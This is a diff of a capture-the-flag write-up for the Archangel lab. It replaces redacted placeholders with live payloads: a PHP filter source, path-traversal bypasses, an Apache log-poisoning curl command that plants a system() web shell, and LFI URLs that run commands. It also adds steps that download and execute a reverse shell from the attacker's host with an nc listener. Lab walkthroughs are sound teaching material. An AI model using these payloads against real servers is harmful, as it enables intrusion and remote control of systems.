@@ -88,26 +88,68 @@ Decoding the response exposed the page logic and the second flag.
 ||thm{explo1t1ng_lf1}||
 ```
 
-The source showed that the filter checked for `../..` and required the path to contain the development directory. The bypass was to use an alternate traversal pattern that still resolved correctly.
+The decoded source showed the relevant filter logic:
+
+```php
+<?php
+// FLAG: ||thm{explo1t1ng_lf1}||
+
+function containsStr($str, $substr) {
+    return strpos($str, $substr) !== false;
+}
+
+if (isset($_GET["view"])) {
+    if (!containsStr($_GET["view"], "../..") && containsStr($_GET["view"], "/var/www/html/development_testing")) {
+        include $_GET["view"];
+    } else {
+        echo "Sorry, Thats not allowed";
+    }
+}
+?>
+```
+
+The source showed that the filter checked for `../..` and required the path to contain the development directory. The bypass was to use an alternate traversal pattern such as `..//..`, which still resolved correctly.
 
 ## 4. Command Execution
 
-Apache access-log poisoning was used to turn the file include into command execution. The original payload is not stored in this public writeup because Windows Defender flags live web shell and callback payload strings. In short:
+Apache access-log poisoning was used to turn the file include into command execution. Apache records request headers in its access log, so I sent a PHP command-execution snippet in the `User-Agent` header and then included the log file through the LFI.
 
-- Send a harmless command marker through a request header.
-- Include the Apache access log through the LFI path.
-- Pass a safe test command through the page parameter and confirm command output.
-- Use a lab-only callback payload to obtain shell access.
+```bash
+curl -A '<?php system($_GET["cmd"]); ?>' http://mafialive.thm/
+```
 
-### Safe Placeholder
-```text
-[redacted log-poisoning command-execution payload]
-[redacted callback-shell delivery URL]
+With the PHP snippet written into the log, I included the Apache access log and passed a test command through the `cmd` parameter.
+
+```http
+http://mafialive.thm/test.php?view=%2Fvar%2Fwww%2Fhtml%2Fdevelopment_testing%2F%2F..%2F%2F..%2F%2F..%2F%2Flog%2Fapache2%2Faccess.log&cmd=uname
 ```
 
 > **Warning:** Only run payloads like this in a lab or on a system you are explicitly authorised to test.
 
+After confirming command execution, I used the Pentestmonkey PHP reverse shell as the callback payload.
+
+```text
+https://github.com/pentestmonkey/php-reverse-shell
+```
+
+On my attacking machine, I served the edited reverse shell and started a listener.
+
+```bash
+python3 -m http.server 1337
+nc -lvnp 1337
+```
+
+Then I used the poisoned log to download and execute the shell on the target.
+
+```http
+http://mafialive.thm/test.php?view=%2Fvar%2Fwww%2Fhtml%2Fdevelopment_testing%2F..%2F.%2F..%2F.%2F..%2Flog%2Fapache2%2Faccess.log&cmd=wget%20http://<your-ip>:1337/shell.php%20-O%20/tmp/shell.php
+```
+
+```http
+http://mafialive.thm/test.php?view=%2Fvar%2Fwww%2Fhtml%2Fdevelopment_testing%2F..%2F.%2F..%2F.%2F..%2Flog%2Fapache2%2Faccess.log&cmd=php%20/tmp/shell.php
+```
+
 After the callback connected, I stabilised the shell and continued enumeration from the low-privileged web user.
 
 ## 5. Summary
-Archangel links together virtual-host discovery, LFI source disclosure, filter bypasses, log poisoning, and Linux privilege escalation. The public writeup keeps the method and flags, but redacts live payload strings so the repository does not trip local antivirus scanners.
+Archangel links together virtual-host discovery, LFI source disclosure, filter bypasses, log poisoning, and Linux privilege escalation.
